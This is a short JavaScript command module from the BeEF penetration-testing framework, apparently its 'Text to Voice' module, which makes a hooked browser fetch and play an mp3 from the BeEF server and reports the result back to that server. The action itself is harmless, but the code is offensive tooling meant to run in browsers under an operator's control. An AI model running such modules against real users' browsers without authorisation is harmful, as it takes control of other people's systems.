//
// Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {	

  var url = beef.net.httpproto+'://'+beef.net.host+':'+beef.net.port+'/objects/msg-<%= @command_id %>.mp3';
  try {
    var sound = new Audio(url);
    sound.play();
    beef.debug('[Text to Voice] Playing mp3: ' + url);
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=message sent", beef.are.status_success());
  } catch (e) {
    beef.debug("[Text to Voice] HTML5 audio unsupported. Could not play: " + url);
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "fail=audio not supported", beef.are.status_error());
  }

});
